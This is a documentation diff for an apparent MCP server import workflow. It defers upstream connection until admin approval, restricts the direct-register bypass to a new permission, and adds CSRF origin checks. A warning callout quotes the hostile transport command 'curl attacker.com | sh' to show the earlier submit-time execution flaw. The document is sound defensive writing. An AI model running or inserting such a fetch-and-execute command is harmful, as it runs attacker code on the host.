@@ -25,16 +25,31 @@ for the design rationale.
 ## Lifecycle
 
 1. **Submit** — user calls any `POST /api/imports/{openapi\|sql\|graphql\|mcp}`.
-   Response includes `approvalStatus: "pending"`. Row created in `servers` with
-   `submitted_by = <principal.id>`. Capabilities are snapshotted so admin can
-   preview tools.
+   The server **does not connect to the upstream** — the request body is
+   persisted verbatim in `metadata.importSpec`, the row lands in `pending`
+   with `submitted_by = <principal.id>`. Response: `{ ok, approvalStatus,
+   snapshotDeferred: true }`.
 2. **Review** — admin calls `GET /api/imports/pending` (or opens
-   `/imports/pending` in the console).
-3. **Decide** — admin calls `POST /api/imports/:id/approve` or `POST /api/imports/:id/reject`
-   with `{ reason?: string }`. Both actions write an audit log entry and invalidate
-   the router capability cache.
+   `/imports/pending` in the console). Only transport config is visible;
+   there is no capability snapshot yet.
+3. **Decide** — admin calls `POST /api/imports/:id/approve`. This is the FIRST
+   time the upstream is touched: server loads `metadata.importSpec`, runs the
+   corresponding blueprint (`loadOpenApi` / `importPostgres` / `importGraphql`
+   / `importMcp`), snapshots capabilities, and marks approved. Or `POST /api/imports/:id/reject`
+   with `{ reason?: string }` — server stays in `rejected` state; upstream is
+   never contacted. Both actions write an audit log entry and invalidate the
+   router capability cache.
 4. **Route** — approved servers appear in `tools/list` and accept `tools/call`.
    Non-approved dispatch returns JSON-RPC error `-32002`.
+
+<Callout type="warning">
+**Deferred probe is a security boundary.** Prior to this change, submitting a
+`stdio` MCP mirror with `command: "curl attacker.com | sh"` was executed at
+submit time — before any admin review. Now the command only runs when an
+admin approves. Corollary: **never approve a submission without reviewing the
+`transport` field.** Rejecting an unknown submission is free and does not
+touch the upstream.
+</Callout>
 
 <Callout type="info">
 Re-submitting the same `id` (via `onConflict`) resets `approval_status` back to
@@ -58,10 +73,25 @@ Index `servers_approval_status_idx` supports the admin queue query.
 
 ## Admin infrastructure bypass
 
-`POST /api/servers` (direct register, admin infra path, guarded by `server:write`)
+`POST /api/servers` (direct register, admin infra path, guarded by `server:admin`)
 uses `autoApprove: true` and lands the server in `approved` state immediately.
 Use this path only from provisioning scripts / GitOps flows — not from user-facing
-imports.
+imports. Since `developer` role does NOT have `server:admin`, this endpoint cannot
+be used to bypass moderation.
+
+## CSRF protection
+
+Session-cookie requests to state-changing endpoints (POST/PUT/PATCH/DELETE)
+must present an `Origin` (or `Referer`) header matching one of the origins in
+`MAVIO_TRUSTED_ORIGINS` (comma-separated env). In dev (env unset), the server
+allows any localhost/127.0.0.1 origin. Bearer-token (API-key) requests are
+exempt — API keys are not attached by browsers.
+
+Configure the trusted origins for the console you serve:
+
+```bash
+MAVIO_TRUSTED_ORIGINS="https://console.mavio.example.com"
+```
 
 ## Router gate
 
